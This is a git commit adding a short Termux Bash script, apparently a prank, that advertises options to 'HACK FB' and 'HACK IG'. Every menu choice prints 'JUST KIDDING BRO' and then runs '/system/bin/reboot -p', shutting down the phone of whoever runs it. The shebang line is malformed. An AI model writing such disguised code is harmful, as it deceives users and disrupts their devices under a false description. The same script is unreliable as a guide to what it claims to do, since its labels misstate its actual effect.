114b7019ae71c617df8eec2c9eca88a54fc6fc4f
andaajacok <46090285+mrbeler@users.noreply.github.com>
2019-03-15 08:51:43 -0700

    Add files via upload

---
+++ index.sh
@@ -0,0 +1,37 @@
+!/data/data/com/termux/files/usr/bin/bash
+#TOOLLS HACKEEEE
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo $yellow"WELCOME TO MY TOOLS"
+echo $red"GOOD LUCKY"
+echo $green"--====[PROGRAM BY ANDA]====--"
+echo "++[====MENU====]++"
+echo $blue"[1] HACK FB"
+echo $cyan"[2] HACK IG"
+read -p "[?] pilih seterah lu cuk [1-2]:" pilih
+case $pilih in
+	1)
+echo "[*] WAITING FOR 5 HOURS...."
+sleep 2
+echo "[*] JUST KIDDING BRO"
+sleep 5
+/system/bin/reboot -p
+;;
+	2)
+echo "[*] WAITING FOR 5 HOURS...."
+sleep 2
+echo "[*] JUST KIDDING BRO"
+sleep 5
+/system/bin/reboot -p
+;;
+*)
+echo "[*] YOU WRONG BACK AGAIN...."
+sleep 2
+;;
+esac
